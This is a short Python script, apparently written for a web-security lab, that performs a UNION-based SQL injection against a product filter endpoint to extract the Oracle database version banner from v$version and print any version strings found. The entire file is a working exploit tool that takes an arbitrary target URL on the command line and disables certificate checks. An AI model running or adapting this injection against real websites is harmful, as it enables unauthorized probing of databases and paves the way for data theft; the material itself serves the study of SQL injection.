import requests
import sys
from bs4 import BeautifulSoup
import re
import urllib3
# Suppresses "certificate verification is strongly advised" warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def  get_oracle_db_info(url):
    if url[len(url)-1] == "/":
        url=url[:-1]

    path = '/filter?category=Corporate+gifts'
    sql_payload = "'UNION+SELECT+BANNER,NULL+FROM+v$version--"
    
    r = requests.get(url + path + sql_payload, verify=False)

    soup = BeautifulSoup(r.text, 'html.parser')

    # Regex to grab every entry that looks like a version number.
    regex = ".*(.+[.]\d+[.]\d+[.]\d+[.]\d.+).*"
    results = soup.find_all(text=re.compile(regex))

    if results:  
        for r in results:
            print("[+] - '%s'" % r)
    else:
        print("[!] No results found")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage : %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    
    print("[~] Attempting to use SQL injection to get Oracle DB info")

    get_oracle_db_info(url)

    